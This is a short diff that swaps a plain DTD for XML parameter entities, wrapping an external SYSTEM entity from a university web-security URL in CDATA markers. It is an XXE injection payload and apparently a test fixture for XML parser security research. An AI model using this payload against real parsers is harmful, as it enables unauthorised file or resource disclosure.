@@ -1,2 +1,4 @@
-<!ELEMENT root (message)>
-<!ELEMENT message (#PCDATA)>
+ <!ENTITY % start "<![CDATA[">
+	<!ENTITY % file SYSTEM "https://internal.websec.cs.uni-paderborn.de/second">
+	<!ENTITY % end "]]>">
+	<!ENTITY all "%start;%file;%end;">
